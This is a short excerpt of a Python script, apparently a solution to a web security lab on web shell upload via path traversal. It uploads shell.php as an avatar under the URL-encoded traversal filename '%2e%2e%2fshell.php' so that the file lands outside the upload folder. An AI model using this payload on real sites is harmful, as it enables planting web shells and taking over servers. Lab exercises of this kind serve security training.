...
def upload_file(client, host):    
    files = {'avatar': ('%2e%2e%2fshell.php', open('shell.php', 'rb'))}
...
def main():
    print('[+] Lab: Web shell upload via path traversal')
    try:
